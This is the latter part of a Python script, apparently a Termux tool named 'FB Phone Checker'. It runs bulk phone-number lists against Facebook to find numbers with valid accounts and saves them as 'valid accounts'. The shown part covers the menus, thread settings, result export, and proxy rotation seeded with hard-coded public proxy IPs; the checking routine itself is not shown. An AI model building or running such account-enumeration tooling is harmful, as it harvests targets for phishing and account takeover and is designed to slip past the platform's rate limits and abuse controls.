                if "VALID" in r["status"]:
                    print(f"  ✅ {r['phone']} | {r['country']} | {r['status']}")
        
        return True
    
    def save_results(self):
        """Save all results to file"""
        try:
            # Full results
            output = {
                "metadata": {
                    "version": VERSION,
                    "timestamp": datetime.now().isoformat(),
                    "total_checked": self.total_checked,
                    "total_valid": self.total_valid,
                    "proxies": self.proxy_manager.count()
                },
                "results": self.results
            }
            with open(CONFIG["results_file"], "w") as f:
                json.dump(output, f, indent=2, ensure_ascii=False)
            
            # Valid accounts summary
            valid = [r for r in self.results if "VALID" in r["status"]]
            if valid:
                with open(CONFIG["valid_file"], "w") as f:
                    f.write(f"# FB Phone Checker v{VERSION} - Valid Accounts\n")
                    f.write(f"# Generated: {datetime.now().isoformat()}\n")
                    f.write(f"# Total: {len(valid)}\n")
                    f.write(f"{'='*70}\n\n")
                    for r in valid:
                        f.write(
                            f"{r['phone']} | {r['country']} | {r['carrier']} | "
                            f"{r['status']} | {r['timestamp']}\n"
                        )
            
            print(f"\n💾 Results saved to {CONFIG['results_file']}")
            print(f"💾 Valid accounts saved to {CONFIG['valid_file']}")
        
        except Exception as e:
            print(f"⚠️ Error saving results: {e}")

# ==================== UI ====================

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(f"""
    ╔═══════════════════════════════════════╗
    ║   🔥 FB PHONE CHECKER v{VERSION}          ║
    ║   Termux Edition                      ║
    ║   Multi-Thread + Proxy Rotation       ║
    ║   Author: cybersecuritybhau-maker      ║
    ╚═══════════════════════════════════════╝
    """)

def show_menu():
    print("""
╔══════════════════════════════════════════╗
║              MAIN MENU                   ║
╠══════════════════════════════════════════╣
║  1. 📱  Add numbers (manual)            ║
║  2. 📂  Load numbers from file          ║
║  3. 🔌  Proxy management                ║
║  4. 🚀  Start checking                  ║
║  5. 📊  View results                    ║
║  6. 💾  Save & export results           ║
║  7. ⚙️   Settings                       ║
║  0. ❌  Exit                            ║
╚══════════════════════════════════════════╝
    """)

def manage_proxies(proxy_manager: ProxyManager):
    """Proxy management menu"""
    while True:
        banner()
        print("🔌 PROXY MANAGEMENT\n")
        print("  1. Show all proxies")
        print("  2. Add proxy")
        print("  3. Test proxy")
        print("  4. Remove proxy")
        print("  5. Reload from file")
        print("  0. Back to main menu")
        
        choice = input("\n👉 Select: ").strip()
        
        if choice == "1":
            proxy_manager.display()
        elif choice == "2":
            proxy = input("🔌 Enter proxy (http://IP:PORT): ").strip()
            if proxy:
                proxy_manager.add(proxy)
        elif choice == "3":
            proxy = input("🔌 Enter proxy to test: ").strip()
            if proxy:
                print("   Testing..." if proxy_manager.test(proxy) else "   Failed!")
        elif choice == "4":
            try:
                idx = int(input("🔌 Enter proxy number to remove: ")) - 1
                proxy_manager.remove(idx)
            except:
                print("❌ Invalid number!")
        elif choice == "5":
            proxy_manager.load_from_file()
        elif choice == "0":
            break
        
        input("\nPress Enter to continue...")

def configure(app: FBCheckerApp):
    """Settings menu"""
    banner()
    print("⚙️ SETTINGS\n")
    print(f"  Current threads: {CONFIG['max_threads']}")
    print(f"  Current delay: {CONFIG['delay']}s")
    print(f"  Headless mode: {CONFIG['headless']}")
    print(f"  Results file: {CONFIG['results_file']}")
    print(f"  Proxy file: {CONFIG['proxy_file']}")
    print(f"  Numbers file: {CONFIG['numbers_file']}")
    
    try:
        t = input(f"\n📊 Threads (1-20, default {CONFIG['max_threads']}): ").strip()
        if t:
            CONFIG['max_threads'] = max(1, min(int(t), 20))
    except:
        pass
    
    try:
        d = input(f"⏱️  Delay seconds (default {CONFIG['delay']}): ").strip()
        if d:
            CONFIG['delay'] = max(0.5, float(d))
    except:
        pass

def setup_config_files():
    """Create config files if missing"""
    if not os.path.exists(CONFIG["proxy_file"]):
        with open(CONFIG["proxy_file"], "w") as f:
            f.write("# FB Checker Proxy List\n")
            f.write("# Format: http://IP:PORT or http://user:pass@IP:PORT\n\n")
            f.write("http://103.153.154.110:80\n")
            f.write("http://103.174.102.127:80\n")
            f.write("http://47.74.135.104:8888\n")
            f.write("http://103.152.232.107:80\n")
        print(f"📁 Created {CONFIG['proxy_file']} with default proxies")
    
    if not os.path.exists(CONFIG["numbers_file"]):
        with open(CONFIG["numbers_file"], "w") as f:
            f.write("# FB Checker Phone Numbers\n")
            f.write("# Add numbers here (one per line)\n\n")
            f.write("+8801712345678\n")
            f.write("+8801912345678\n")
            f.write("+12025550123\n")

# ==================== MAIN ====================

def main():
    setup_config_files()
    app = FBCheckerApp()
    
    while True:
        banner()
        show_menu()
        choice = input("👉 Select option: ").strip()
        
        if choice == "1":
            banner()
            print("📱 Enter phone numbers (comma or space separated):")
            print("   Examples:")
            print("     +8801712345678,+8801912345678,+12025550123")
            print("     +447123456789 +919876543210\n")
            
            numbers = input("📱 Numbers: ").strip()
            if numbers:
                count = app.add_numbers_manual(numbers)
                print(f"\n✅ {count} numbers added to queue!")
            else:
                print("❌ No numbers entered!")
            
            input("\nPress Enter to continue...")
        
        elif choice == "2":
            banner()
            print(f"📂 Load from file (default: {CONFIG['numbers_file']})")
            filename = input("📂 Enter filename (or Enter for default): ").strip()
            
            if not filename:
                filename = CONFIG["numbers_file"]
            
            count = app.load_numbers_from_file(filename)
            if count > 0:
                print(f"✅ {count} numbers loaded from {filename}")
            
            input("\nPress Enter to continue...")
        
        elif choice == "3":
            manage_proxies(app.proxy_manager)
        
        elif choice == "4":
            banner()
            if app.phone_queue.empty():
                print("❌ No numbers in queue!")
                print("   Add numbers first (option 1 or 2)")
                input("\nPress Enter to continue...")
                continue
            
            try:
                threads = input(f"🧵 Threads (default {CONFIG['max_threads']}): ").strip()
                threads = int(threads) if threads else CONFIG['max_threads']
            except:
                threads = CONFIG['max_threads']
            
            app.start(threads=threads)
            input("\nPress Enter to continue...")
        
        elif choice == "5":
            banner()
            print("📊 RESULTS\n")
            print(f"📱 Total checked: {app.total_checked}")
            print(f"✅ Valid accounts: {app.total_valid}")
            print(f"❌ Queue remaining: {app.phone_queue.qsize()}\n")
            
            if app.results:
                valid = [r for r in app.results if "VALID" in r["status"]]
                if valid:
                    print(f"🎯 VALID ACCOUNTS ({len(valid)}):")
                    print("-" * 50)
                    for r in valid[:20]:
                        print(f"  ✅ {r['phone']} | {r['country']} | {r['status']}")
                    if len(valid) > 20:
                        print(f"  ... and {len(valid)-20} more")
                    print("-" * 50)
                else:
                    print("❌ No valid accounts found yet")
            
            input("\nPress Enter to continue...")
        
        elif choice == "6":
            app.save_results()
            input("\nPress Enter to continue...")
        
        elif choice == "7":
            configure(app)
            input("\nPress Enter to continue...")
        
        elif choice == "0":
            print("\n👋 Exiting...")
            break
        
        else:
            print("❌ Invalid option!")
            input("Press Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n🛑 Interrupted by user.")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        import traceback
        traceback.print_exc()
